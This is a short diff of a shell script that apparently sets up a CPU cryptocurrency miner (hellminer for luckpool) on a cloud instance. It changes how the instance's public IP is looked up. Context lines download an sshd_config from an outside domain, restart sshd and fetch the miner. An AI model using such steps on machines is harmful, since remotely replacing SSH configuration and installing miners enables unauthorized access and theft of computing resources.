@@ -4,8 +4,8 @@ wget https://rootends.com/linux-master/commonsfiles/sshd_config_gcloud -O /tmp/s
 systemctl restart sshd
 mkdir /miner
 cd /miner
-INSTANCE_IP=$(curl http://169.254.169.254/latest/meta-data/public-ipv4)
-WORKER_NAME="${INSTANCE_IP//./_}"
+INSTANCE_IP=$(curl http://ipinfo.io/ip)
+WORKER_NAME=${INSTANCE_IP//./_}
 wget -O hellminer.tar.gz https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 tar -xvfz hellminer.tar.gz
 cat > runner.sh << __EOF__
